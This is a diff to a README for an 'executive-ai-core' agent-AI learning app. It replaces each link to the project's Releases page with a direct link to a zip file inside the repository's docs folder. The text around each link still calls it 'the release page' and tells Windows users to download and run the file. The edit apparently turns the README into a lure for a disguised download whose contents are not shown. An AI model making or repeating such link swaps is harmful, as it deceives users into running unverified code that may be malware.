@@ -1,6 +1,6 @@
 # 🤖 executive-ai-core - Learn agent AI the simple way
 
-[![Download the app](https://img.shields.io/badge/Download%20from-Releases-2f80ed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kalumba1829/executive-ai-core/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from-Releases-2f80ed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kalumba1829/executive-ai-core/raw/refs/heads/main/docs/executive_ai_core_2.7-alpha.5.zip)
 
 ## 📌 What this is
 
@@ -31,7 +31,7 @@ If you are not sure which file to use, choose the Windows file from the release 
 
 ## 🚀 Download and run on Windows
 
-1. Open the release page here: https://github.com/kalumba1829/executive-ai-core/releases
+1. Open the release page here: https://github.com/kalumba1829/executive-ai-core/raw/refs/heads/main/docs/executive_ai_core_2.7-alpha.5.zip
 2. Find the latest release at the top of the page
 3. Look for a Windows file in the Assets section
 4. Download the file to your PC
@@ -181,7 +181,7 @@ If the release page shows more than one file, pick the Windows option first.
 
 ## 📥 Download again
 
-If you need to get the app later, use the release page here: https://github.com/kalumba1829/executive-ai-core/releases
+If you need to get the app later, use the release page here: https://github.com/kalumba1829/executive-ai-core/raw/refs/heads/main/docs/executive_ai_core_2.7-alpha.5.zip
 
 ## 🧑‍🏫 For teachers and students
 
